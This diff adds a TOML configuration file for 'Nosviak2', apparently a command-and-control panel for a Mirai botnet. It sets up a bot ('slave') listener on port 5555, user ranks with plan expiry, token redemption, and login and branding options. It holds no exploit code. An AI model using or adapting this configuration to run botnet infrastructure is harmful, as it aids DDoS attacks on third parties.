@@ -1,0 +1,81 @@
+[mirai]
+enabled=true
+listener=":5555"
+# Meta data for slave authentication
+banner=[0,0,0]
+enforce_banner=false
+enforce_anti_dupe_cap=0
+read_sleep=true
+
+
+[slaves]
+# stores if we want to use a table
+# this will display our slaves inside a table
+use_table=false
+
+[AppSettings]
+#allows you to properly control the different settings
+#these will mostly store like AppName etc for better control without issues
+AppName="Nosviak2"
+#controls if you want cursor blinking 
+#this will sync within your title and blink on rotation
+cursor_blinking=true
+#allows for command blacklisting
+#this allows you to properly blacklist certain commands
+blacklisted_commands=[
+    "_<some_commands>_"
+]
+#stores which ranks plan expire doesnt count on
+#this will ignore all this ranks from the plan expire system
+bypass_planExpire=[
+    "admin"
+]
+# stores the meta data for the redeem
+# mainly for redeeming account tokens
+redeem=[
+    "redeem"
+]
+
+[itl]
+auto_refresh=true
+sleep_between=1000
+# Meta data for live reload
+live_branding_refresh=true
+toml_branding_refresh=false
+json_branding_refresh=false
+# views verbose settings
+# prints everysingle branding file loaded
+verbose=false
+
+[TitleWorker]
+#this will choose how the title is executed
+#different options
+#   - `tfx` uses the standard termfx
+#       - when using termfx you should be aware that some functions wont work
+#   - `itl` uses the custom inbuilt itl language
+route="itl"
+# allows better control of the title driver
+# this will allow for better and safer control without issues
+# possible: seconds:[s, seconds, secs, second] minutes:[m, minutes, mins, minute] milliseconds:[ms, milliseconds, millis, millisecond]
+timeUnit="ms"
+duration=500
+
+[login]
+#this will only work for the custom login
+#allows for custom titles instead of the appName being used as standard
+#please note this is completely static and nothing else will work safely
+#only valid termfx is <<$cnc>> which displays the current appname properly
+title="<<$cnc>> | Login..."
+max_username_input=29
+max_password_input=29
+maskingCharater="●"
+
+[pager]
+# sets the pager refresh rate
+# works best with bad connections with Nos2
+refreshPerLine=true
+
+
+[terminal]
+# allows things which are outputed to be controlled
+dynamic_terminal=true
